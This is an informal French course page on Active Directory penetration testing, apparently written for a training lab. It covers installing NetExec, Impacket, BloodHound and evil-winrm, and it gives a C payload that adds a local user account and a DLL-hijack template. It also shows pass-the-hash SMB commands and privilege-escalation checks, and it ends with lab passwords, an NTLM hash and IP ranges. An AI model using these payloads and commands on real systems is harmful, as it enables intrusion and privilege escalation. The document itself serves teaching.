---
title: Cours Active Directory du pauvre
tag: AD
date: '2024-01-10'
---

**_On essaye d'apprendre des trucs ouuuuuuuuuuuuuuuuuuuu_**

# Installation de la caisse à outils

L'ensemble des outils requiert Python3. Si ce dernier n'est pas installé, vous devez le faire pour garantir un fonctionnement sans entraves.

## NXC

NXC, un fork agressif de CrackMapExec (CME), est préféré à CME. NetExec, alias NXC, est un outil polyvalent essentiel à maîtriser dans le contexte de cette évaluation de sécurité.

```
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
python3 -m venv .
source ./bin/activate
pip3 install .
deactivate
touch ~/.klemouWasHere
```

### Usage:

nxc est présent dans ./bin/nxc

```
nxc smb 10.10.10.0/24 -u '' -p ''
```

## Impacket

Outils indispensables pour réaliser un test d'intrusion à partir d'un environnement Linux. Il convient de noter que ces outils sont déjà inclus dans NXC. Je réitère cette information au cas où, tout étant déjà incorporé dans ce qui a été précédemment évoqué.

```
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m venv .
source ./bin/activate
pip3 install .
deactivate
touch ~/.klemouWasHere1
```

### Usage:

Tu attends la suite du cours.

## Bloodhound

Un autre outil indispensable est BloodHound, qui offre la visualisation graphique des éléments de l'Active Directory, permettant ainsi d'identifier et de proposer des scénarios de compromission.

Neo4j
```
docker pull neo4j
docker run -d --rm -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/CrzTonWifiCestDeLaMerde neo4j
```

Bloodhound
```
https://github.com/BloodHoundAD/BloodHound # tu chope la release
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64 && ./Bloodhound
```

Si tu n'as pas docker kado [install](https://letmegooglethat.com/?q=docker+linux)

### Usage:

Ca hack fort ouuuuuuuuuuuuuuuuuuuuuuuuuuuu

## Evil-winrm

blabla

```
gem install evil-winrm # bien ajouter la path de gem à ca $PATH
```

### Usage:

```bash
evil-winrm -u user -p password -i ip
```

## Psencoder

Petite auto promo :
- https://psencoder.pythonanywhere.com/

## Compilation cross OS

### Package a installé (Chat GPT édition)

```
# Debian/Ubuntu
sudo apt-get update
sudo apt-get install mingw-w64

# Fedora
sudo dnf install mingw64-gcc mingw64-gcc-c++ mingw64-winpthreads-static

# openSUSE
sudo zypper install mingw64-gcc mingw64-gcc-c++

# Arch Linux
sudo pacman -S mingw-w64-gcc

# CentOS (Utilisez EPEL pour CentOS)
sudo yum install mingw64-gcc mingw64-gcc-c++

# Alpine Linux
sudo apk add mingw-w64-gcc mingw-w64-g++ mingw-w64-headers

# Void Linux
sudo xbps-install -S mingw-w64-gcc mingw-w64-g++ mingw-w64-headers
```

### Compilation d'un EXE

```
x86_64-w64-mingw32-gcc -o magie.exe magie.c   # 64 bits
i686-w64-mingw32-gcc   -o magie.exe magie.c   # 32 bits
```

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){
    system("net user klemou Sup3rP@ssword /add");
    return 0;
}
```

### Compilation d'une DLL

```
x86_64-w64-mingw32-gcc   -shared -o target.dll target.c
i686-w64-mingw32-gcc     -shared -o target.dll target.c
```

```c
#include <windows.h>

void Payload()
{
  // magie
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}
```

Les projets qui vont bien:
 - https://github.com/tothi/dll-hijack-by-proxying

# Windows

## Shares

### smbclient

```bash
# Debian/Ubuntu-based systems (using apt)
apt-get update && apt-get install smbclient

# Red Hat/Fedora-based systems (using dnf)
dnf install samba-client

# CentOS (using yum)
yum install samba-client

# Arch Linux (using pacman)
pacman -S smbclient
```

```
smbclient -N -L \\\\ip
smbclient -N \\\\ip\\Share
smbclient -U 'User%Password' \\\\ip\\Share
smbclient --pw-nt-hash -U 'user%hash' \\\\ip\\Share
```

### mount

```
# Debian/Ubuntu-based systems (using apt)
apt-get update && apt-get install cifs-utils

# Red Hat/Fedora-based systems (using dnf)
dnf install cifs-utils

# CentOS (using yum)
yum install cifs-utils

# Arch Linux (using pacman)
pacman -S cifs-utils

# openSUSE (using zypper)
zypper install cifs-utils
```

```
mount -t cifs //ip/Name /point/de/montage/
mount -t cifs -o username=crz,password=TonWifiEstNull //ip/Name /point/de/montage/
```

### nxc

```
nxc smb ip
nxc smb ip -u 'user' -p 'password'
nxc smb ip -u 'user' -H ':CC978D063970FC60FD9DA830D160A229'
```

### windows

```
net share
net use Z: \\computer_name\share_name
```

## Services

### windows

```
sc query          # cmd.exe
Get-Service       # powershell.exe
wmic service get  # wmic
services.msc      # UI
```

#### En mode jolie

```
wmic service get name,displayname,startmode,pathname,startname
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode, StartName
```

#### Unquoted service

```
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode, StartName | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName,StartName
```

## Privilèges

### SeImpersonate
Explication et exploitation:
-   https://jlajara.gitlab.io/Potatoes_Windows_Privesc
-   https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

### Activation de tout les privilèges

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1


# Lab

## **AD**
```
Administrator : fe63693e9e.2e90861a9c
antoine       : 099bd3d1c39.c22d1a464
```

## Srv standelone
```
klemou        : 634daa6f9.4519be0b91c  #CC978D063970FC60FD9DA830D160A229
sa            : MssqlPasswordFTW123!
```
## plage

```
10.10.10.10-20    # serveur du domaine
10.10.10.20-30    # machine utilisateur du domaine
10.10.10.50-80    # serveur standelone 
10.10.10.150-250  # pc perso
```

